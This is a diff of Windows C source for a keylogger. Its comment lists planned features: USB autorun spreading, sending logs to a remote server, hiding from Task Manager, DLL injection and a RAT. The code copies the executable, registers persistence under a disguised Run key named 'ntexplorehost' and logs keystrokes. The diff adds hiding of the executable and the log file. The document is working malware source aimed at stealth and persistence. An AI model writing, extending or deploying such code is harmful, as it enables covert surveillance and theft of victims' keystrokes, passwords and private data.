@@ -21,6 +21,7 @@
 *	(x)Run the program in the moved location and get the log working in there
 *	()Send the log away to remote server once a day - on separate thread
 *	()Check to see if USB is connected if so add autorun.ini and hide the exe on there
+*	(x)Make exe and log hidden
 *	()Hide from Task Manager
 *	(optional)Perhaps inject the logger as dll into explorer or something important
 *	(optional)create a RAT
@@ -44,13 +45,13 @@ int get_keys(char* location);
 
 int main(void)
 {
-	
+	/*
 	//this is a WIN32 console application so I hid the cmd prompt.
 	HWND hidden;
 	AllocConsole();
 	hidden = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(hidden, 0);
-	
+	*/
 
 
 	//gets current directory and puts it into the systems drive
@@ -86,16 +87,16 @@ int main(void)
 	//move the exe to the destination described above
 	CopyFileA(pathToFile,system, false);
 	
-	//move location into the registry
+	//next segment moves location into the registry
 	HKEY hKey;
 	
-	
-
 	//try to open the registry
 	if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
 	{
 		printf("UNABLE TO OPEN REGISTRY KEY\n");
 	}
+
+
 	if (RegQueryValueEx(hKey, TEXT("ntexplorehost"), NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
 	{//if the value does not exist in the key...
 
@@ -135,10 +136,11 @@ int main(void)
 			else
 			{
 				printf("it started..? yes. Why yes it did");
+				//hide the exe
+				SetFileAttributes(appName, FILE_ATTRIBUTE_HIDDEN);
+				//kill this because the other process was opened.
 				exit(EXIT_SUCCESS);
 			}
-
-			
 		}
 
 		RegCloseKey(hKey);
@@ -182,6 +184,13 @@ int get_keys(char* location)
 				}
 				if (file != NULL)
 				{
+					//workaround to hide log
+					wchar_t workit[MAX_PATH];
+					mbstowcs(workit, location, strlen(location) + 1);
+					LPWSTR appName = workit;
+					SetFileAttributes(appName, FILE_ATTRIBUTE_HIDDEN);
+
+
 					if ((character >= 39) && (character <= 64))
 					{
 						fputc(character, file);
